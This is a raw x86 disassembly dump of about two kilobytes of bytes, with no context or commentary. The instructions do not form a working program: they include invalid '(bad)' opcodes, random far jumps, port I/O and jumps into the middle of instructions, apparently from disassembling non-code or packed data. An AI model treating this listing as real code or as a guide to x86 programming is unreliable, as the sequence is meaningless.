  408f77:	sub    eax,0xe0d0ca10
  408f7c:	int3   
  408f7d:	mov    DWORD PTR [edx+0x12],edx
  408f80:	adc    al,BYTE PTR [eax+edx*8]
  408f83:	enter  0xde6b,0xd0
  408f87:	ror    DWORD PTR [edi],cl
  408f89:	mov    esp,esp
  408f8b:	es stos BYTE PTR es:[edi],al
  408f8d:	pusha  
  408f8e:	xor    ch,dh
  408f90:	mov    esi,0x272966e1
  408f95:	mov    ebp,0x3b36142a
  408f9a:	das    
  408f9b:	lahf   
  408f9c:	sub    DWORD PTR [esi+0x18],ebp
  408f9f:	xor    eax,0xcdbad26f
  408fa4:	cmp    esp,edx
  408fa6:	scas   eax,DWORD PTR es:[edi]
  408fa7:	imul   BYTE PTR [esi-0x4f9d4fdc]
  408fad:	cwde   
  408fae:	mov    ebp,0x28f9ba01
  408fb3:	adc    dl,BYTE PTR [esi+esi*8-0x21]
  408fb7:	into   
  408fb8:	stos   BYTE PTR es:[edi],al
  408fb9:	ja     0x408ff5
  408fbb:	pop    esi
  408fbc:	mov    eax,0xc71a0d93
  408fc1:	mov    bl,0x69
  408fc3:	call   0x4c7a3e57
  408fc8:	js     0x408f8d
  408fca:	fwait
  408fcb:	pop    ecx
  408fcc:	pop    ds
  408fcd:	mov    esi,0xb2120fa6
  408fd2:	lds    eax,FWORD PTR [ebx-0x52636276]
  408fd8:	push   ebp
  408fd9:	jmp    0xf434:0x4e22a482
  408fe0:	adc    al,0xd9
  408fe2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408fe3:	retf   
  408fe4:	dec    edi
  408fe5:	pop    ebp
  408fe6:	push   ss
  408fe7:	out    dx,eax
  408fe8:	aaa    
  408fe9:	dec    esp
  408fea:	sbb    DWORD PTR [ecx],esi
  408fec:	(bad)  
  408fed:	jns    0x408ff7
  408fef:	dec    edi
  408ff0:	jnp    0x409047
  408ff2:	push   ss
  408ff3:	test   eax,0xb73e5408
  408ff8:	push   0xf140b701
  408ffd:	add    al,0x38
  408fff:	sub    al,BYTE PTR [ebp+0x23]
  409002:	in     eax,0xc6
  409004:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409005:	mov    ebp,0xebe323f7
  40900a:	stc    
  40900b:	push   cs
  40900c:	cmp    eax,0xa251faec
  409011:	out    0xa7,eax
  409013:	pop    edx
  409014:	or     eax,0xdcca54a5
  409019:	jl     0x40908d
  40901b:	popf   
  40901c:	pop    ecx
  40901d:	sbb    al,0x43
  40901f:	sbb    ebx,DWORD PTR ds:0xffaca117
  409025:	shl    DWORD PTR [ebx+0x57],0x6
  409029:	stos   DWORD PTR es:[edi],eax
  40902a:	inc    eax
  40902b:	dec    eax
  40902c:	mov    bl,0x41
  40902e:	sbb    al,0x76
  409030:	bound  ebp,QWORD PTR [ebx-0x472ebe6]
  409036:	sbb    eax,0xaff856cf
  40903b:	icebp  
  40903c:	test   BYTE PTR [ecx],dh
  40903e:	mov    edi,0x9ed35112
  409043:	pop    edi
  409044:	push   0x9129a65
  409049:	clc    
  40904a:	in     al,0x3d
  40904c:	mov    al,0xa3
  40904e:	stos   DWORD PTR es:[edi],eax
  40904f:	je     0x40901a
  409051:	push   eax
  409052:	popf   
  409053:	sub    DWORD PTR [esp+edi*2-0x737ed0bd],ebp
  40905a:	pushf  
  40905b:	mov    BYTE PTR [ebx-0x19456f43],ah
  409061:	jmp    0xacf79da7
  409066:	loop   0x408ff9
  409068:	mov    bl,0xcb
  40906a:	fwait
  40906b:	retf   
  40906c:	mov    edx,0x3a7157cf
  409071:	add    BYTE PTR [esi+eiz*4-0x7d],bh
  409075:	sbb    al,0xe9
  409077:	in     al,dx
  409078:	add    ebp,DWORD PTR [ebp+0x4c]
  40907b:	lds    esi,FWORD PTR [ecx-0x20c21d7a]
  409081:	mov    eax,DWORD PTR [ebp-0x9]
  409084:	nop
  409085:	js     0x409066
  409087:	pop    ss
  409088:	ja     0x40901e
  40908a:	cmp    dh,dh
  40908c:	jg     0x409043
  40908e:	sub    ebx,DWORD PTR [ebp+ecx*8+0x20b9c403]
  409095:	push   ebx
  409096:	ds sti 
  409098:	push   sp
  40909a:	lods   eax,DWORD PTR ss:[esi]
  40909c:	jne    0x40905d
  40909e:	ret    0xdab9
  4090a1:	mov    al,ds:0x39a5e95f
  4090a6:	leave  
  4090a7:	and    al,0x7c
  4090a9:	fcom   DWORD PTR [edi]
  4090ab:	mov    ebx,0xbb71c499
  4090b0:	pop    eax
  4090b1:	add    eax,0xe2d57788
  4090b6:	mov    ds:0xe7b55271,eax
  4090bb:	cmp    edi,esp
  4090bd:	mov    ds:0xebcbc877,al
  4090c2:	mov    edi,es
  4090c4:	inc    ebx
  4090c5:	push   ecx
  4090c6:	inc    edx
  4090c7:	mov    al,0x91
  4090c9:	xor    al,0x25
  4090cb:	mov    DWORD PTR [ecx],ebp
  4090cd:	jp     0x4090ff
  4090cf:	push   eax
  4090d0:	gs jne 0x40913f
  4090d3:	sti    
  4090d4:	mov    edx,0xff10ddb2
  4090d9:	and    eax,0x5831553b
  4090de:	push   ecx
  4090df:	pop    edi
  4090e0:	in     eax,dx
  4090e1:	fldcw  WORD PTR [ebp+edi*2-0x695f2f18]
  4090e8:	dec    ebx
  4090e9:	jl     0x4090c1
  4090eb:	mov    bh,0xa3
  4090ed:	aas    
  4090ee:	stc    
  4090ef:	ja     0x40908f
  4090f1:	ret    
  4090f2:	int3   
  4090f3:	fidivr WORD PTR [ebx+0x60]
  4090f6:	aas    
  4090f7:	or     al,0x9e
  4090f9:	and    ebx,0xdfd9f5a2
  4090ff:	cmp    DWORD PTR [ecx+esi*8],ecx
  409102:	fwait
  409103:	shl    DWORD PTR ds:0x9eca0ac3,cl
  409109:	xor    al,0x97
  40910b:	ret    0xfe4d
  40910e:	push   0xffffff87
  409110:	sbb    BYTE PTR [ecx-0x9],al
  409113:	loop   0x4090e1
  409115:	mov    bl,0x19
  409117:	(bad)  
  409118:	outs   dx,DWORD PTR ds:[esi]
  409119:	repnz pop edi
  40911b:	push   eax
  40911c:	mov    al,ds:0xcecc26de
  409121:	jmp    0x40916f
  409123:	fisttp QWORD PTR [ebp+0x7f]
  409126:	std    
  409127:	rcr    DWORD PTR [edx],cl
  409129:	sub    eax,0x3b541195
  40912e:	call   0x85de8982
  409133:	enter  0xdbef,0x2c
  409137:	xlat   BYTE PTR ds:[ebx]
  409138:	out    dx,al
  409139:	int3   
  40913a:	shr    dh,0x6c
  40913d:	jno    0x4090d6
  40913f:	sub    ebp,DWORD PTR [edi+0x2b35d3b2]
  409145:	sar    BYTE PTR [eax+0x12c8aaa3],0x11
  40914c:	retf   0x2080
  40914f:	xor    edx,0xffffff8e
  409152:	sub    bh,BYTE PTR [esi+0x7d]
  409155:	pop    ds
  409156:	dec    edi
  409157:	int    0x9
  409159:	pop    edi
  40915a:	mov    cl,0xd3
  40915c:	mov    ebx,0xb57c4c6c
  409161:	dec    esp
  409162:	inc    BYTE PTR [ebx]
  409164:	or     BYTE PTR [ebp+0x45],al
  409167:	xchg   esp,eax
  409168:	int    0x44
  40916a:	jmp    WORD PTR [eax-0xb]
  40916e:	or     BYTE PTR [bx+di+0x3111],ch
  409173:	mov    ds:0x90b80b67,eax
  409178:	lods   eax,DWORD PTR ds:[esi]
  409179:	dec    edx
  40917a:	les    esi,FWORD PTR [edx+ebx*2]
  40917d:	jp     0x409161
  40917f:	stc    
  409180:	pusha  
  409181:	jmp    eax
  409183:	push   ss
  409184:	icebp  
  409185:	jno    0x409152
  409187:	popa   
  409188:	adc    al,0xcb
  40918a:	(bad)  
  40918b:	ret    
  40918c:	push   ecx
  40918d:	lock in eax,dx
  40918f:	dec    esi
  409190:	ret    
  409191:	sti    
  409192:	int    0xb2
  409194:	adc    eax,0x9b1bd6fe
  409199:	stc    
  40919a:	aad    0xda
  40919c:	sub    eax,0x2f9d02f1
  4091a1:	fist   WORD PTR [esi]
  4091a3:	and    ecx,DWORD PTR [esi+0x594ceb2]
  4091a9:	push   ebx
  4091aa:	gs dec edi
  4091ac:	adc    BYTE PTR [ebx],dh
  4091ae:	(bad)  
  4091af:	mov    ch,0xf6
  4091b1:	mov    al,ds:0xc720f3d7
  4091b6:	inc    esi
  4091b7:	and    ebp,0x2408b839
  4091bd:	imul   ebp,DWORD PTR [edx-0xa],0xffffffb0
  4091c1:	pop    ebx
  4091c2:	inc    esp
  4091c3:	sar    DWORD PTR [eax+0x41],cl
  4091c6:	fld    QWORD PTR [ecx+0x7df635b]
  4091cc:	add    dh,BYTE PTR [esi]
  4091ce:	sar    DWORD PTR [edx+0x8],cl
  4091d1:	aaa    
  4091d2:	push   esi
  4091d3:	test   al,0x28
  4091d5:	out    0x22,al
  4091d7:	mov    ch,0xd7
  4091d9:	sbb    eax,0xc7518fe5
  4091de:	mov    dl,0x5e
  4091e0:	aad    0xd8
  4091e2:	xor    ecx,esp
  4091e4:	fwait
  4091e5:	sahf   
  4091e6:	nop    DWORD PTR [ecx]
  4091e9:	push   ecx
  4091ea:	inc    ebx
  4091eb:	mov    ebp,0xdbde0698
  4091f0:	dec    esp
  4091f1:	sti    
  4091f2:	cwde   
  4091f3:	pushf  
  4091f4:	sub    eax,0xa253c44d
  4091f9:	lds    eax,FWORD PTR [edi]
  4091fb:	mov    dh,0x82
  4091fd:	mov    ecx,0x881c985b
  409202:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409203:	sub    eax,0x3f5b73b8
  409208:	in     al,dx
  409209:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40920a:	sbb    al,0xbb
  40920c:	bound  eax,QWORD PTR [edi+0x5d]
  40920f:	push   ebp
  409210:	ja     0x4091d5
  409212:	jae    0x40922a
  409214:	sbb    DWORD PTR [edx+0x71],ecx
  409217:	xchg   BYTE PTR [esi-0x37],cl
  40921a:	push   edx
  40921b:	adc    BYTE PTR [ebp-0x2d],cl
  40921e:	mov    ah,0x60
  409220:	cmp    edi,eax
  409222:	xchg   edx,eax
  409223:	adc    DWORD PTR [esp+eax*8-0x61],esp
  409227:	xlat   BYTE PTR ds:[ebx]
  409228:	add    eax,0xf0de49f2
  40922d:	sbb    BYTE PTR [ebp-0x3],cl
  409230:	aad    0x93
  409232:	mov    ch,0x10
  409234:	dec    esp
  409235:	adc    BYTE PTR [eax-0xb06322e],0xb8
  40923c:	mov    DWORD PTR [esp+ecx*1],esi
  40923f:	cdq    
  409240:	jmp    0x42e1:0xa17e5bb9
  409247:	mov    eax,0xf1a8aab1
  40924c:	in     al,dx
  40924d:	cmc    
  40924e:	mov    eax,0xc2876a1f
  409253:	pop    eax
  409254:	sbb    al,0x7f
  409256:	test   eax,0xdb939823
  40925b:	and    eax,0xf9c48f21
  409260:	jmp    DWORD PTR [eax]
  409262:	mov    ss,WORD PTR gs:[eax-0x27]
  409266:	loop   0x409209
  409268:	out    0x49,al
  40926a:	inc    eax
  40926c:	mov    DWORD PTR [esi+0x3a],eax
  40926f:	pop    esp
  409270:	test   cl,cl
  409272:	in     al,0x7d
  409274:	mov    esp,0xb8857439
  409279:	dec    edi
  40927a:	push   ss
  40927b:	and    eax,edx
  40927d:	push   0x6b
  40927f:	adc    ch,cl
  409281:	call   0xd8445f79
  409286:	repnz aad 0x58
  409289:	and    BYTE PTR [ebp+0x70],0x9b
  40928d:	pop    ebx
  40928e:	mov    ch,0x3c
  409290:	rcr    DWORD PTR [esi+esi*1-0x71917713],0x41
  409298:	mov    dl,0x36
  40929a:	sub    eax,0xdc6ccda
  40929f:	adc    BYTE PTR ds:0x4d1a6c3e,dh
  4092a5:	jo     0x40930f
  4092a7:	outs   dx,BYTE PTR ds:[esi]
  4092a8:	sbb    al,0xc0
  4092aa:	and    DWORD PTR [ebp-0x2b],esi
  4092ad:	mov    ?,WORD PTR [edx-0x61e5c86f]
  4092b3:	cmp    ah,BYTE PTR [ecx+0x12e7493c]
  4092b9:	ffree  st(5)
  4092bb:	mov    bl,0x39
  4092bd:	rol    al,0x4f
  4092c0:	fld    QWORD PTR [ecx+edx*1+0x8]
  4092c4:	xchg   edx,eax
  4092c5:	mov    cl,0x4d
  4092c7:	mov    dl,0x87
  4092c9:	dec    ecx
  4092ca:	fadd   QWORD PTR ds:0xa367d97d
  4092d0:	cmc    
  4092d1:	jmp    0x4092fb
  4092d3:	mov    WORD PTR [esi-0x60fe4a25],ss
  4092d9:	dec    esi
  4092da:	inc    edx
  4092db:	sbb    BYTE PTR [ecx-0x4b],cl
  4092de:	ds mov esi,0xbf7f551b
  4092e4:	inc    ebx
  4092e5:	push   0x43
  4092e7:	add    BYTE PTR [edi+ebx*2],bl
  4092ea:	in     al,dx
  4092eb:	inc    eax
  4092ec:	xchg   edx,eax
  4092ed:	aaa    
  4092ee:	or     ebp,edx
  4092f0:	push   ebx
  4092f1:	xor    BYTE PTR [edi],0xe
  4092f4:	popa   
  4092f5:	inc    eax
  4092f6:	imul   eax,DWORD PTR [ebp+0xecedd65],0x9d168bd6
  409300:	inc    edi
  409301:	mov    cl,0xc4
  409303:	scas   al,BYTE PTR es:[edi]
  409304:	and    DWORD PTR [ebx],eax
  409306:	sti    
  409307:	add    edi,DWORD PTR [esi]
  409309:	dec    esp
  40930a:	sar    esp,cl
  40930c:	jl     0x4092ca
  40930e:	dec    edi
  40930f:	dec    esi
  409310:	or     ah,dl
  409312:	push   ecx
  409313:	pusha  
  409314:	or     ecx,DWORD PTR [ebx]
  409316:	cli    
  409317:	arpl   WORD PTR [eax-0x19215268],bp
  40931d:	ds leave 
  40931f:	outs   dx,DWORD PTR ds:[esi]
  409320:	mov    edi,0x2cbc8203
  409325:	dec    ebp
  409326:	or     edx,0x1f223c22
  40932c:	xchg   ecx,eax
  40932d:	pop    ebp
  40932e:	cdq    
  40932f:	jns    0x4092bc
  409331:	aaa    
  409332:	sahf   
  409333:	cmp    BYTE PTR [esi+0x255649b9],0xee
  40933a:	or     al,BYTE PTR [esi+eax*4+0x6f]
  40933e:	adc    esp,DWORD PTR [edx+0x4d]
  409341:	mov    ah,0xd2
  409343:	xor    DWORD PTR [eax+eax*2-0x6b],eax
  409347:	xchg   esi,eax
  409348:	push   0xffffffe5
  40934a:	aad    0xe0
  40934c:	add    al,0xb3
  40934e:	dec    edi
  40934f:	add    esp,eax
  409351:	stos   DWORD PTR es:[edi],eax
  409352:	mov    ds:0x4ccc6b7c,al
  409357:	mov    ecx,0xf005541d
  40935c:	out    0x3c,al
  40935e:	mov    ch,bl
  409360:	adc    ebp,ebx
  409362:	retf   
  409363:	sbb    BYTE PTR [esi-0x22],cl
  409366:	adc    eax,0xd2f5e617
  40936b:	cmp    al,BYTE PTR [ecx+0x17]
  40936e:	xor    eax,DWORD PTR [edx+0xbf38fbb]
  409374:	xor    ebx,DWORD PTR [edx]
  409376:	ret    
  409377:	lods   al,BYTE PTR ds:[esi]
  409378:	and    eax,DWORD PTR [ebx-0x5a]
  40937b:	add    al,dh
  40937d:	mov    edx,0xe42c93f3
  409382:	repnz ins BYTE PTR es:[edi],dx
  409384:	daa    
  409385:	ret    
  409386:	neg    DWORD PTR [esi]
  409388:	push   es
  409389:	dec    eax
  40938a:	sub    dl,BYTE PTR [edi-0xd20706f]
  409390:	stos   DWORD PTR es:[edi],eax
  409391:	push   DWORD PTR [eax-0x50]
  409394:	inc    ebx
  409395:	mov    ch,0x3a
  409397:	lahf   
  409398:	pusha  
  409399:	mov    ah,0x5f
  40939b:	mov    dl,0x88
  40939d:	xlat   BYTE PTR ds:[ebx]
  40939e:	jle    0x40939f
  4093a0:	pop    ebp
  4093a1:	ins    DWORD PTR es:[edi],dx
  4093a2:	std    
  4093a3:	adc    DWORD PTR [eax+0x1607cf37],edx
  4093a9:	test   eax,0x3f0df2f4
  4093ae:	sbb    al,0x85
  4093b0:	mov    ds:0x9243d042,eax
  4093b5:	in     eax,dx
  4093b6:	retf   0x5514
  4093b9:	imul   edi,DWORD PTR [eiz*8+0x28bc21de],0x4cee9ba6
  4093c4:	mov    dl,0xe7
  4093c6:	xchg   ebp,eax
  4093c7:	and    edx,DWORD PTR [ebx-0x7a5b6aa0]
  4093cd:	sbb    BYTE PTR [edx-0x3646591f],0xf2
  4093d4:	stos   DWORD PTR es:[edi],eax
  4093d5:	pusha  
  4093d6:	icebp  
  4093d7:	retf   
  4093d8:	fdiv   QWORD PTR [ecx+ebx*8]
  4093db:	leave  
  4093dc:	mov    eax,ebp
  4093de:	ror    esp,1
  4093e0:	out    dx,eax
  4093e1:	arpl   WORD PTR ds:0xda1ad37b,cx
  4093e7:	sub    BYTE PTR [edi+0x5c554389],dl
  4093ed:	mov    ds:0xec89a72c,al
  4093f2:	jecxz  0x4093ad
  4093f4:	scas   al,BYTE PTR es:[edi]
  4093f5:	sar    BYTE PTR ds:0x70647a3,1
  4093fb:	inc    ebx
  4093fc:	xchg   ebp,eax
  4093fd:	mov    bh,ah
  4093ff:	test   al,0x5b
  409401:	xor    dl,BYTE PTR [ecx-0x77621c77]
  409407:	xchg   esp,eax
  409408:	jmp    0xf10:0xe8f1d9be
  40940f:	(bad)  
  409410:	mov    ch,BYTE PTR [eax]
  409412:	mov    ds:0xc4bf3b7,al
  409417:	js     0x40942e
  409419:	pop    eax
  40941a:	sbb    eax,0x859cf23
  40941f:	push   ebx
  409420:	or     esi,DWORD PTR [ecx]
  409422:	cmp    al,0x2f
  409424:	repz loop 0x4093e8
  409427:	in     al,dx
  409428:	jnp    0x409459
  40942a:	push   es
  40942b:	dec    edi
  40942c:	pop    ss
  40942d:	cmp    ch,al
  40942f:	jns    0x4093ec
  409431:	adc    eax,0x2ad9346
  409436:	pop    ebp
  409437:	je     0x40949f
  409439:	mov    esp,0xb9337245
  40943e:	pop    esp
  40943f:	test   al,0x1e
  409441:	(bad)  
  409442:	outs   dx,BYTE PTR ds:[esi]
  409443:	push   ecx
  409444:	and    DWORD PTR [edx],0x7d0d76b
  40944a:	aaa    
  40944b:	pop    ebp
  40944c:	mov    ah,0x7f
  40944e:	mov    ?,WORD PTR [ecx-0x26]
  409451:	xchg   DWORD PTR [eax],ecx
  409453:	mov    eax,ds:0xda82db35
  409458:	idiv   ebx
  40945a:	pop    ecx
  40945b:	or     DWORD PTR [esi+eiz*4],ebp
  40945e:	push   ds
  40945f:	inc    eax
  409460:	dec    esi
  409461:	daa    
  409462:	loope  0x40941b
  409464:	mov    edi,0x4baa047a
  409469:	xor    al,0xfc
  40946b:	test   DWORD PTR [ecx-0x1d],0x384d8721
  409472:	in     al,0x45
  409474:	mov    ah,0x73
  409476:	lods   al,BYTE PTR ds:[esi]
  409477:	sbb    BYTE PTR [eax+0x480135a6],dl
  40947d:	icebp  
  40947e:	in     eax,0x50
  409480:	xlat   BYTE PTR ds:[ebx]
  409481:	outs   dx,BYTE PTR fs:[esi]
  409483:	xchg   esi,eax
  409484:	xchg   edi,eax
  409485:	dec    edi
  409486:	(bad)  
  409488:	ja     0x4094e3
  40948a:	mov    bh,0x13
  40948c:	inc    eax
  40948d:	sub    eax,0xa33cc6d4
  409492:	cli    
  409493:	adc    cl,BYTE PTR [eax+0xa07fc81]
  409499:	arpl   cx,cx
  40949b:	xchg   DWORD PTR [edx],ebp
  40949d:	test   DWORD PTR [ecx+eax*8],ecx
  4094a0:	dec    edx
  4094a1:	dec    eax
  4094a2:	inc    ecx
  4094a3:	cli    
  4094a4:	lods   al,BYTE PTR ds:[esi]
  4094a5:	jno    0x409439
  4094a7:	imul   ebx,ecx,0x132eca4e
  4094ad:	pop    ebx
  4094ae:	ret    
  4094af:	pop    ebp
  4094b0:	adc    BYTE PTR [ecx+0x13],bl
  4094b3:	push   cs
  4094b4:	or     bl,dh
  4094b6:	xor    ah,dl
  4094b8:	daa    
  4094b9:	js     0x40945c
  4094bb:	push   ss
  4094bc:	fcomip st,st(3)
  4094be:	mov    ds:0x8c089897,al
  4094c3:	test   al,0xfb
  4094c5:	inc    ebx
  4094c6:	inc    eax
  4094c7:	jmp    0x57cf:0xaa020aac
  4094ce:	arpl   WORD PTR ds:0xa486f67c,sp
  4094d4:	mov    ds:0xe1a540a9,eax
  4094d9:	mov    ds:0xfacd39da,al
  4094de:	jle    0x40950e
  4094e0:	aad    0xa9
  4094e2:	outs   dx,BYTE PTR ds:[esi]
  4094e3:	das    
  4094e4:	mov    ds:0xa99023d6,eax
  4094e9:	cmp    bl,ah
  4094eb:	(bad)  
  4094ec:	xchg   edx,eax
  4094ed:	cmp    DWORD PTR [ecx+0x1a],ebx
  4094f0:	fidiv  WORD PTR [ebx+0x57163fb0]
  4094f6:	daa    
  4094f7:	clc    
  4094f8:	scas   al,BYTE PTR es:[edi]
  4094f9:	xchg   edi,eax
  4094fa:	js     0x409494
  4094fc:	pop    esi
  4094fd:	in     eax,0x16
  4094ff:	push   cs
  409500:	cs sub al,0x16
  409503:	stos   DWORD PTR es:[edi],eax
  409504:	stos   BYTE PTR es:[edi],al
  409505:	jbe    0x4094ca
  409507:	dec    esp
  409508:	lahf   
  409509:	js     0x4094ca
  40950b:	and    al,0x62
  40950d:	push   0x2b388e06
  409512:	push   esi
  409513:	in     al,0xc9
  409515:	in     al,dx
  409516:	add    esp,DWORD PTR [ebx+esi*8+0x148d2305]
  40951d:	and    BYTE PTR [ebx],ch
  40951f:	imul   esp,DWORD PTR [ecx+0x22],0xffffff8b
  409523:	repz jge 0x409566
  409526:	adc    dl,ch
  409528:	jns    0x409565
  40952a:	mov    eax,ds:0xe19abaf6
  40952f:	outs   dx,BYTE PTR ds:[esi]
  409530:	nop
  409531:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409532:	mov    ebp,0x86560580
  409537:	in     eax,0x12
  409539:	push   ecx
  40953a:	in     eax,dx
  40953b:	test   al,0x46
  40953d:	daa    
  40953e:	sbb    BYTE PTR [edx+0x60],ah
  409541:	aam    0xab
  409543:	mov    edi,ebp
  409545:	mov    edi,0x5ab9244c
  40954a:	sub    al,0xbb
  40954c:	mov    ebp,0x971fa486
  409551:	sbb    DWORD PTR [ecx-0x3cc2decb],0x18594523
  40955b:	xchg   DWORD PTR [edx+0x7],ecx
  40955e:	cli    
  40955f:	les    edi,FWORD PTR [ecx+0x50]
  409562:	dec    ebp
  409563:	jmp    0x409548
  409565:	mov    ah,0xa
  409567:	jne    0x4095ac
  409569:	jns    0x409538
  40956b:	mov    ss,ecx
  40956d:	cmp    BYTE PTR [edi*4-0x4b552f64],dh
  409574:	mov    edi,DWORD PTR [edx]
  409576:	jmp    0xd58b55e5
  40957b:	mov    ds:0xf530a44f,eax
  409580:	sahf   
  409581:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409582:	stos   DWORD PTR es:[edi],eax
  409583:	enter  0xe53d,0x6e
  409587:	mov    edx,ds
  409589:	cdq    
  40958a:	(bad)  
  40958b:	push   ds
  40958c:	cmp    BYTE PTR [edi+ebp*8-0x43],ah
  409590:	(bad)  
  409592:	and    ebx,ebp
  409594:	into   
  409595:	mov    esi,DWORD PTR gs:[ebx-0x4]
  409599:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40959a:	pop    eax
  40959b:	xor    BYTE PTR [ecx-0x66304665],0x0
  4095a2:	and    dx,WORD PTR [edi+0x59b6d66b]
  4095a9:	lock std 
  4095ab:	loope  0x40962c
  4095ad:	xchg   BYTE PTR [edx-0x60ab9020],dl
  4095b3:	xchg   BYTE PTR [edi+0x7f636de0],al
  4095b9:	stos   BYTE PTR es:[edi],al
  4095ba:	imul   ecx,DWORD PTR [esi+0x64],0x48
  4095be:	mov    cl,0x69
  4095c0:	jns    0x40962a
  4095c2:	and    esp,0x68
  4095c5:	rcr    DWORD PTR [edx-0x87b193],1
  4095cb:	xchg   DWORD PTR [edi+esi*4+0x2b],esi
  4095cf:	push   esp
  4095d0:	adc    DWORD PTR [ebx-0x16],0x35
  4095d4:	iret   
  4095d5:	jmp    DWORD PTR [eax-0x10]
  4095d8:	loop   0x409619
  4095da:	jns    0x40961f
  4095dc:	ret    0xb473
  4095df:	jmp    0x409568
  4095e1:	push   cs
  4095e2:	xor    al,0xfd
  4095e4:	iret   
  4095e5:	cwde   
  4095e6:	clc    
  4095e7:	mov    edx,0x71e4ebf4
  4095ec:	cli    
  4095ed:	add    ebp,DWORD PTR [ecx+0x2e]
  4095f0:	dec    edi
  4095f1:	mov    ebx,0x73a2b371
  4095f6:	popa   
  4095f7:	mov    BYTE PTR [ecx+0x1c2efd29],ah
  4095fd:	or     al,0x7c
  4095ff:	scas   eax,DWORD PTR es:[edi]
  409600:	into   
  409601:	cmc    
  409602:	add    eax,0x9cac36a8
  409607:	add    edx,ebx
  409609:	mov    ds:0x42dd8142,eax
  40960e:	mov    ds:0x92520cb8,al
  409613:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409614:	sbb    DWORD PTR [ebp-0x73],esi
  409617:	xchg   ecx,eax
  409618:	mov    ds:0x132eb812,al
  40961d:	push   eax
  40961e:	bound  ebp,QWORD PTR [ebp+0x455a789d]
  409624:	imul   BYTE PTR [ebp-0x39010722]
  40962a:	adc    DWORD PTR [edi],0xa682b8b
  409630:	bound  eax,QWORD PTR [ecx]
  409632:	add    edx,eax
  409634:	jo     0x409610
  409636:	dec    ecx
  409637:	push   esp
  409638:	pop    edx
  409639:	rol    DWORD PTR [ebx],0xbd
  40963c:	pusha  
  40963d:	jmp    0x7791:0x33cf34ed
  409644:	push   ecx
  409645:	jns    0x4095da
  409647:	mov    esp,0x2cca96cd
  40964c:	addr16 mov ebx,0x48c57167
  409652:	mov    eax,0x159e6982
  409657:	mov    DWORD PTR [ebp+0x60],edx
  40965a:	shl    BYTE PTR [esi+0x3022394],0x25
  409661:	aad    0x41
  409663:	(bad)  
  409664:	xchg   esp,eax
  409665:	stos   DWORD PTR es:[edi],eax
  409666:	rcr    DWORD PTR [edx-0x3990e274],0xea
  40966d:	pop    es
  40966e:	or     esp,DWORD PTR [eax]
  409670:	jne    0x409661
  409672:	xor    eax,0xd5b4819c
  409678:	jb     0x409659
  40967a:	loope  0x4096b4
  40967c:	mov    ds:0x7a3eda13,eax
  409681:	push   esi
  409682:	push   edi
  409683:	dec    esi
  409684:	shl    DWORD PTR [edx+esi*2],1
  409687:	out    0xe6,eax
  409689:	dec    edi
  40968a:	je     0x4096eb
  40968c:	mov    ds,WORD PTR [edx+0x22f73620]
  409692:	fidiv  WORD PTR [ecx-0x39]
  409695:	mov    dh,0xd3
  409697:	push   eax
  409698:	push   edx
  409699:	leave  
  40969a:	pusha  
  40969b:	push   0x3511b17e
  4096a0:	in     eax,0xa1
  4096a2:	mov    cl,0xe5
  4096a4:	daa    
  4096a5:	rcr    BYTE PTR [eax+esi*1-0x2b],cl
  4096a9:	ja     0x4096a5
  4096ab:	cmp    edi,DWORD PTR [ecx]
  4096ad:	add    eax,0x59b4bec4
  4096b2:	inc    esi
  4096b3:	jp     0x4096e9
  4096b5:	dec    esp
  4096b6:	js     0x40972e
  4096b8:	xchg   edi,eax
  4096b9:	add    al,0x2a
  4096bb:	push   eax
  4096bc:	sti    
  4096bd:	stc    
  4096be:	adc    BYTE PTR ds:0x95fd4f65,0x14
  4096c5:	pop    ss
  4096c6:	mov    cl,0x10
  4096c8:	ins    DWORD PTR es:[edi],dx
  4096c9:	inc    esi
  4096ca:	scas   eax,DWORD PTR es:[edi]
  4096cb:	xor    DWORD PTR [eax+0x28],ebp
  4096ce:	out    dx,eax
  4096cf:	add    edi,DWORD PTR [ecx]
  4096d1:	cli    
  4096d2:	push   ds
  4096d3:	scas   eax,DWORD PTR es:[edi]
  4096d4:	mov    ebp,DWORD PTR [edx-0x20]
  4096d7:	mov    BYTE PTR [ecx-0x2c5d15b6],ah
  4096dd:	add    dl,BYTE PTR [ebx+0x16]
  4096e0:	iret   
  4096e1:	cmp    ch,BYTE PTR [edx+0x7e]
  4096e4:	push   es
  4096e5:	jecxz  0x4096da
  4096e7:	xor    ebx,ebx
  4096e9:	xor    cl,bl
  4096eb:	out    0xe4,al
  4096ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4096ee:	iret   
  4096ef:	dec    ecx
  4096f0:	stos   DWORD PTR es:[edi],eax
  4096f1:	xor    DWORD PTR [ecx+0x22aaf94d],0xc
  4096f8:	mov    ebp,0x204eca7d
  4096fd:	into   
  4096fe:	push   ecx
  4096ff:	mov    al,ds:0x993354ff
  409704:	fadd   QWORD PTR [ecx]
  409706:	aaa    
  409707:	(bad)  
  409708:	out    0x17,al
  40970a:	setne  BYTE PTR [eax-0x4a09a0a]
  409711:	call   0x43cb:0x6420d65d
  409718:	inc    edx
  409719:	mov    al,ds:0xa1e36d4a
  40971e:	pop    edx
  40971f:	mov    bl,0xd1
  409721:	push   ebp
  409722:	(bad)  
  409723:	int    0x1c
  409725:	cli    
  409726:	jmp    0x4096b8
  409728:	jns    0x409714
  40972a:	mov    bl,0x8
  40972c:	out    dx,eax
  40972d:	fst    DWORD PTR [eax]
  40972f:	imul   ecx,DWORD PTR [edi],0x4de5439
  409735:	adc    eax,0x60816198
  40973a:	sti    
  40973b:	pop    edx
  40973c:	mov    al,0x5b
  40973e:	imul   edx,DWORD PTR [ebx-0x69],0xffffffc2
  409742:	push   ss
  409743:	and    al,0xf6
  409745:	daa    
  409746:	js     0x4096f7
  409748:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409749:	adc    eax,DWORD PTR [edx+0x29]
  40974c:	push   ebx
  40974d:	fidivr WORD PTR [ebx+0x36]
  409750:	shl    BYTE PTR ds:0xc53081fd,0xb1
  409757:	icebp  
  409758:	cmp    eax,0x562f2620
  40975d:	aas    
  40975e:	sub    ebp,DWORD PTR [esi]
  409760:	jmp    0x703e:0x699bea00
